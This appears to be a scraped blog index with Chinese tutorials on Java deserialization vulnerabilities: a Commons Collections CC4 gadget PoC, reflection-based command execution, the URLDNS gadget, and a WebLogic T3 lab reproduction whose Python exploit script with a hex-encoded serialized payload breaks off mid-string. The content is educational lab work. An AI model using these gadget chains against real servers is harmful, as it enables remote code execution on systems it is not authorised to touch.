compare() 方法比较树的节点。 POC 如下： package CC4Test; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; public class CC4Test { public static void main(String[] args) throws Exception { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\",new Class[] { String.class }, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Comparator comparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(1); queue.add(2); Field f = transformerChain.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(transformerChain, transformers); // 序列化 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); // 反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); } } 4.2.2 CommonsCollection4 Gadget 改进 PriorityQueue 利用链：因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。所以便有了 CC4，CC4 只是将 CC2 中的 InvokerTransformer 替换为了 InstantiateTransformer。 创建 TemplatesImpl 对象： TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{getBytescode()}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); 创建一个正常的 InvokerTransformer 对象，并用它实例化 Comparator : Transformer transformer = new InvokerTransformer(\"toString\",null,null); Comparator comparator = new TransformingComparator(transformer); 实例化 PriorityQueue ，向队列里添加的元素是前面创建的 TemplatesImpl 对象： PriorityQueue queue = new Pri","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:4:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"参考 phith0n Java 漫谈系列 Java反序列化漏洞原理解析 Java反序列化漏洞从入门到关门 从0开始学Java反序列化漏洞 深入理解 JAVA 反序列化漏洞 Java反序列化利用链补全计划 Commons-Collections 利用链分析 ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:5:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"Java反序列化漏洞","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"Java 反序列化漏洞系列-1 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:0:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"1 序列化与反序列化基础 序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:1:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"1.1 相关方法 ObjectOutputStream 类的 writeObject() 方法可以实现序列化。按 Java 的标准约定是给文件一个 .ser 扩展名。 ObjectInputStream 类的 readObject() 方法用于反序列化。 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:1:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"1.2 序列化前提 实现 java.io.Serializable 接口才可被反序列化，而且所有属性必须是可序列化的(用 transient 关键字修饰的属性除外，不参与序列化过程) ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:1:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"1.3 漏洞成因 序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。 反序列化 payload 生成工具：https://github.com/frohoff/ysoserial/ ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:1:3","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"2 漏洞基本原理 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:2:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"2.1 序列化 序列化后的数据开头包含两字节的魔术数字：ACED。接下来是两字节的版本号 0005 的数据。此外还包含了类名、成员变量的类型和个数等。 序列化的数据流以魔术数字和版本号开头，这个值是在调用 ObjectOutputStream 序列化时，由 writeStreamHeader 方法写入： protected void writeStreamHeader() throws IOException { //STREAM_MAGIC (2 bytes) 0xACED bout.writeShort(STREAM_MAGIC); //STREAM_VERSION (2 bytes) 5 bout.writeShort(STREAM_VERSION); } ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:2:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"2.2 反序列化 Java程序中类 ObjectInputStream 的 readObject 方法用来将数据流反序列化为对象。 readObject() 方法在反序列化漏洞中它起到了关键作用。如果 readObject() 方法被重写，反序列化该类时调用便是重写后的 readObject() 方法。如果该方法书写不当的话就有可能引发恶意代码的执行。 如： public class Evil implements Serializable { public String cmd; private void readObject(java.io.ObjectInputStream stream) throws Exception { stream.defaultReadObject(); Runtime.getRuntime().exec(cmd); } 但是，实际中反序列化漏洞的构造比较复杂，而且需要借助 Java 的一些特性，如 Java 的反射。 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:2:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"3 Java 反射 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"3.1 Java 反射定义 对于任意一个类，都能够得到这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为 java 语言的反射机制。 反射是⼤多数语⾔⾥都存在的特性，对象可以通过反射获取它的类，类可以通过反射拿到所有⽅法（包括私有），拿到的⽅法可以直接调用。总之，通过反射，可以将 Java 这种静态语⾔附加上动态特性。 Java 语言虽然不像 PHP 那样存在许多灵活的动态特性，但是通过反射，可以达到一定的效果，如下面这段代码，在传入参数值不确定的情况下，该函数的具体作用是未知的。 public void execute(String className, String methodName) throws Exception { Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance()); } 在 Java 中定义的一个类本身也是一个对象，即 java.lang.Class 类的实例，这个实例称为类对象 类对象表示正在运行的 Java 应用程序中的类和接口 类对象没有公共构造方法，由 Java 虚拟机自动构造 类对象用于提供类本身的信息，比如有几种构造方法， 有多少属性，有哪些普通方法 要得到类的方法和属性，首先就要得到该类对象 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"3.2 获取类对象 假设现在有一个 Person 类： public class Person implements Serializable { private String name; private Integer age; public Person(String name, Integer age) { this.name = name; this.age = age; } public void setName(String name) { this.name = name; } public String getName() { return this.name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } } 要获取该类对象一般有三种方法： class.forName(\"com.geekby.Person\") Person.class new Person().getClass() 最常用的是第一种，通过一个字符串即类的全路径名就可以得到类对象。 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"3.3 利用类对象创建对象 与直接 new 创建对象不同，反射是先拿到类对象，然后通过类对象获取构造器对象，再通过构造器对象创建一个对象。 package com.geekby; import java.lang.reflect.*; public class CreateObject { public static void main(String[] args) throws Exception { Class PersonClass = Class.forName(\"com.geekby.Person\"); Constructor constructor = PersonClass.getConstructor(String.class, Integer.class); Person p = (Person)constructor.newInstance(\"Geekby\", 24); System.out.println(p.getName()); } } 方法 说明 getConstructor(Class…\u003c?\u003e parameterTypes) 获得该类中与参数类型匹配的公有构造方法 getConstructors() 获得该类的所有公有构造方法 getDeclaredConstructor(Class…\u003c?\u003e parameterTypes) 获得该类中与参数类型匹配的构造方法 getDeclaredConstructors() 获得该类所有构造方法 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:3","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"3.4 利用反射调用方法 public class CallMethod { public static void main(String[] args) throws Exception { Class PersonClass = Class.forName(\"com.geekby.Person\"); Constructor constructor = PersonClass.getConstructor(String.class, Integer.class); Person p = (Person)constructor.newInstance(\"Geekby\", 24); Method m = PersonClass.getDeclaredMethod(\"setName\", String.class); m.invoke(p, \"newGeekby\"); System.out.println(p.getName()); } } 方法 说明 getMethod(String name, Class…\u003c?\u003e parameterTypes) 获得该类某个公有的方法 getMethods() 获得该类所有公有的方法 getDeclaredMethod(String name, Class…\u003c?\u003e parameterTypes) 获得该类某个方法 getDeclaredMethods() 获得该类所有方法 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:4","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"3.5 通过反射访问属性 public class AccessAttribute { public static void main(String[] args) throws Exception { Class PersonClass = Class.forName(\"com.geekby.Person\"); Constructor constructor = PersonClass.getConstructor(String.class, Integer.class); Person p = (Person) constructor.newInstance(\"Geekby\", 24); // name是私有属性，需要先设置可访问 Field f = PersonClass.getDeclaredField(\"name\"); f.setAccessible(true); f.set(p, \"newGeekby\"); System.out.println(p.getName()); } } 方法 说明 getField(String name) 获得某个公有的属性对象 getFields() 获得所有公有的属性对象 getDeclaredField(String name) 获得某个属性对 getDeclaredFields() 获得所有属性对象 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:5","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"3.6 利用反射执行代码 public class Exec { public static void main(String[] args) throws Exception { //java.lang.Runtime.getRuntime().exec(\"calc\"); Class runtimeClass = Class.forName(\"java.lang.Runtime\"); // getRuntime是静态方法，invoke时不需要传入对象 Object runtime = runtimeClass.getMethod(\"getRuntime\").invoke(null); runtimeClass.getMethod(\"exec\", String.class).invoke(runtime,\"open /System/Applications/Calculator.app\"); } } 以上代码中，利用了 Java 的反射机制把我们的代码意图都利用字符串的形式进行体现，使得原本应该是字符串的属性，变成了代码执行的逻辑，而这个机制也是后续的漏洞使用的前提。 tips invoke 的作用是执行方法，它的第一个参数是: 如果该方法为普通方法，那么第一个参数是类对象 如果该方法为静态方法，那么第一个参数是类或 null 此外，另一种常用的执行命令的方式 ProcessBuilder，通过反射来获取其构造函数，然后调用 start() 来执行命令: Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start(); 查看文档可知：ProcessBuilder 有两个构造函数： public ProcessBuilder(List\u003cString\u003e command) public ProcessBuilder(String... command) 上面通过反射的调用方式使用了第一种形式的构造函数。 但是，上述的 Payload 用到了 Java 里的强制类型转换，有时候我们利用漏洞的时候(在表达式上下文中)是没有这种语法的。因此，仍需利用反射来执行 start 方法。 Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"open\", \"/System/Applications/Calculator.app\"))); 上述的第二种构造函数如何调用呢？ 对于可变长参数，Java 在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价的： public void hello(String[]names){} public void hello(String...names){} 因此，对于反射来说，如果目标函数里包含可变长参数，传入数组即可。 Classclazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getConstructor(String[].class) 在调用 newInstance 的时候，因为该函数本身接收的是一个可变长参数： 传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个 Payload 如下: Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{\"open\", \"/System/Applications/Calculator.app\"}})); ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:6","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"3.7 反序列化漏洞与反射 在安全研究中，使⽤反射的⼀⼤⽬的，就是绕过某些沙盒。比如，上下文中如果只有 Integer 类型的数字，如何获取到可以执行命令的 Runtime 类： 比如可以这样（伪代码）：1.getClass().forName(\"java.lang.Runtime\") ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:3:7","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"4 DNSURL gadget 分析 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:4:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"4.1 调用链 * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() payload： HashMap ht = new HashMap(); URL u = new URL(\"dnslog\"); // 这里在序列化时不发送请求，防止在反序列化探测时误判 Class c = u.getClass(); Field f = c.getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(u, 1234); ht.put(u, \"Geekby\"); // 把 hashcode 改为 -1，还原 f.set(u, -1); ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:4:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"4.2 分析 首先查看 HashMap 的 ReadObject 方法 339 行：在调用 putVal 方法之前会调用 hash 方法，查看其源代码： 899 - 903 行：如果 key == null，hashcode 赋值为 0。key 存在的话，则调用 key 的 hashcode 方法。 在本 gadget 中，key 为 URL 对象。接着，跟进 URL 的 hashCode 方法。 URL 类的 hashCode 很简单。如果 hashcode 不为 -1，则返回 hashcode。在序列化构造 payload 的时候，需要设置 hashcode 为 -1 的原因，就是防止进入到 hashcode 方法中，进而发送 DNS 请求，影响判断。 当 hashcode==-1 ，调用 handler 的 hashCode 方法。该类的定义在 URL 的构造函数中，主要是根据 scheme 去决定用什么类做 handler。在这里是 URLStreamHandler 类，跟进 URLStreamHandler 的 hashcode 方法。 在第 359 行，调用 getHostAddress 获取域名对应的 IP。 DNSURL 链便是利用该处，来触发 DNSLog 发送请求。 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:4:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["代码审计"],"content":"参考 phith0n Java 漫谈系列 Java反序列化漏洞原理解析 Java反序列化漏洞从入门到关门 从0开始学Java反序列化漏洞 深入理解 JAVA 反序列化漏洞 Java反序列化利用链补全计划 ","date":"2021-08-15","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/:5:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-1","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/"},{"categories":["漏洞复现"],"content":"Weblogic T3 反序列化漏洞","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["Weblogic","漏洞复现"],"title":"Weblogic T3 反序列化漏洞复现","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"Weblogic T3 反序列化漏洞复现 ","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["Weblogic","漏洞复现"],"title":"Weblogic T3 反序列化漏洞复现","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1 环境搭建 ","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["Weblogic","漏洞复现"],"title":"Weblogic T3 反序列化漏洞复现","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1.1 环境准备 Weblogic 环境采用 A-Team 的 docker 一键搭建：https://github.com/QAX-A-Team/WeblogicEnvironment JDK 安装包下载地址：https://www.oracle.com/technetwork/java/javase/archive-139210.html 下载版本为：jdk-7u21-linux-x64.tar.gz Weblogic 安装包下载地址：https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html 下载版本为：fmw_12.1.3.0.0_wls.jar ","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:1","tags":["Weblogic","漏洞复现"],"title":"Weblogic T3 反序列化漏洞复现","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"1.2 构建镜像 以 Weblogic12.1.3 配 JDK 7u21 为例，构建镜像命令如下： docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=fmw_12.1.3.0.0_wls.jar -t weblogic12013jdk7u21 . 镜像构建完成后，执行以下命令运行： docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic12013jdk7u21 weblogic12013jdk7u21 运行后可访问http://localhost:7001/console/login/LoginForm.jsp登录到Weblogic Server管理控制台，默认用户名为weblogic,默认密码为qaxateam01 ","date":"2021-04-19","objectID":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:2","tags":["Weblogic","漏洞复现"],"title":"Weblogic T3 反序列化漏洞复现","uri":"/2021/04/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"2 漏洞复现 poc如下，目前该 POC 只有回显： #!/usr/bin/python import socket import os import sys import struct import time # if len(sys.argv) \u003c 2: # print 'Usage: python %s \u003cTARGET_HOST\u003e \u003cPORT\u003e' % os.path.basename(sys.argv[0]) # sys.exit() sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) server_address = (\"127.0.0.1\", 7001) # print '[+] Connecting to %s port %s' % server_address sock.connect(server_address) # Send headers headers='t3 9.2.0.0\\nAS:255\\nHL:92\\nMS:10000000\\nPU:t3://abcdefghijklmnabcdefghijklmnabcdefghijklmnabcdefghijklmnabcdefghijklmnabcdefghijklmn:7001\\n\\n' print 'sending \"%s\"' % headers sock.sendall(headers) data = sock.recv(1024) print \u003e\u003esys.stderr, 'received \"%s\"' % data payloadObj='\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x17\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x4c\\x69\\x6e\\x6b\\x65\\x64\\x48\\x61\\x73\\x68\\x53\\x65\\x74\\xd8\\x6c\\xd7\\x5a\\x95\\xdd\\x2a\\x1e\\x02\\x00\\x00\\x78\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x53\\x65\\x74\\xba\\x44\\x85\\x95\\x96\\xb8\\xb7\\x34\\x03\\x00\\x00\\x78\\x70\\x77\\x0c\\x00\\x00\\x00\\x10\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x02\\x73\\x72\\x00\\x19\\x6a\\x61\\x76\\x61\\x2e\\x72\\x6d\\x69\\x2e\\x4d\\x61\\x72\\x73\\x68\\x61\\x6c\\x6c\\x65\\x64\\x4f\\x62\\x6a\\x65\\x63\\x74\\x7c\\xbd\\x1e\\x97\\xed\\x63\\xfc\\x3e\\x02\\x00\\x03\\x49\\x00\\x04\\x68\\x61\\x73\\x68\\x5b\\x00\\x08\\x6c\\x6f\\x63\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x5b\\x00\\x08\\x6f\\x62\\x6a\\x42\\x79\\x74\\x65\\x73\\x71\\x00\\x7e\\x00\\x04\\x78\\x70\\xea\\x0c\\xa3\\xad\\x70\\x75\\x72\\x00\\x02\\x5b\\x42\\xac\\xf3\\x17\\xf8\\x06\\x08\\x54\\xe0\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x10\\xea\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x17\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x4c\\x69\\x6e\\x6b\\x65\\x64\\x48\\x61\\x73\\x68\\x53\\x65\\x74\\xd8\\x6c\\xd7\\x5a\\x95\\xdd\\x2a\\x1e\\x02\\x00\\x00\\x78\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x53\\x65\\x74\\xba\\x44\\x85\\x95\\x96\\xb8\\xb7\\x34\\x03\\x00\\x00\\x78\\x70\\x77\\x0c\\x00\\x00\\x00\\x10\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x02\\x73\\x72\\x00\\x3a\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x6f\\x72\\x67\\x2e\\x61\\x70\\x61\\x63\\x68\\x65\\x2e\\x78\\x61\\x6c\\x61\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x78\\x73\\x6c\\x74\\x63\\x2e\\x74\\x72\\x61\\x78\\x2e\\x54\\x65\\x6d\\x70\\x6c\\x61\\x74\\x65\\x73\\x49\\x6d\\x70\\x6c\\x09\\x57\\x4f\\xc1\\x6e\\xac\\xab\\x33\\x03\\x00\\x08\\x49\\x00\\x0d\\x5f\\x69\\x6e\\x64\\x65\\x6e\\x74\\x4e\\x75\\x6d\\x62\\x65\\x72\\x49\\x00\\x0e\\x5f\\x74\\x72\\x61\\x6e\\x73\\x6c\\x65\\x74\\x49\\x6e\\x64\\x65\\x78\\x5a\\x00\\x15\\x5f\\x75\\x73\\x65\\x53\\x65\\x72\\x76\\x69\\x63\\x65\\x73\\x4d\\x65\\x63\\x68\\x61\\x6e\\x69\\x73\\x6d\\x4c\\x00\\x0b\\x5f\\x61\\x75\\x78\\x43\\x6c\\x61\\x73\\x73\\x65\\x73\\x74\\x00\\x3b\\x4c\\x63\\x6f\\x6d\\x2f\\x73\\x75\\x6e\\x2f\\x6f\\x72\\x67\\x2f\\x61\\x70\\x61\\x63\\x68\\x65\\x2f\\x78\\x61\\x6c\\x61\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x78\\x73\\x6c\\x74\\x63\\x2f\\x72\\x75\\x6e\\x74\\x69\\x6d\\x65\\x2f\\x48\\x61\\x73\\x68\\x74\\x61\\x62\\x6c\\x65\\x3b\\x5b\\x00\\x0a\\x5f\\x62\\x79\\x74\\x65\\x63\\x6f\\x64\\x65\\x73\\x74\\x00\\x03\\x5b\\x5b\\x42\\x5b\\x00\\x06\\x5f\\x63\\x6c\\x61\\x73\\x73\\x74\\x00\\x12\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x43\\x6c\\x61\\x73\\x73\\x3b\\x4c\\x00\\x05\\x5f\\x6e\\x61\\x6d\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x